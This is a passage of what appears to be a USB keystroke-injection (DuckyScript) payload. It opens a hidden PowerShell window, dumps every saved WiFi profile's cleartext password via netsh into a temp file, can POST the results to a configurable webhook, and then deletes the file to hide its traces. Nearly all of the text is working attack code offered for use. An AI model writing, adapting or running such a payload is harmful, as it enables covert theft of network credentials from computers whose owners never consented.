REM     - Exfil server (optional)

REM User configurable options
DEFINE #WEBHOOK https://example.com/hook
DEFINE #EXFIL_ENABLED FALSE

DELAY 1000
GUI r
DELAY 500
STRINGLN powershell -w hidden
DELAY 1500

REM Create output file
STRINGLN $outFile = "$env:TEMP\wifi_creds.txt"
DELAY 200

REM Get all WiFi profiles
STRINGLN $profiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
DELAY 500

REM Extract passwords for each profile
STRINGLN foreach ($profile in $profiles) {
DELAY 200
STRINGLN     $result = netsh wlan show profile name="$profile" key=clear
DELAY 200
STRINGLN     $password = ($result | Select-String "Key Content\s+:\s+(.+)$").Matches.Groups[1].Value
DELAY 200
STRINGLN     if ($password) { "$profile : $password" | Out-File -Append $outFile }
DELAY 200
STRINGLN }
DELAY 2000

REM Exfiltrate results if enabled
REM Set EXFIL_ENABLED to TRUE and configure WEBHOOK above
STRINGLN if ("#EXFIL_ENABLED" -eq "TRUE") { $data = Get-Content $outFile -Raw; Invoke-WebRequest -Uri "#WEBHOOK" -Method POST -Body $data }
DELAY 500

REM Cleanup
STRINGLN Remove-Item $outFile -Force -ErrorAction SilentlyContinue
DELAY 200
STRINGLN exit
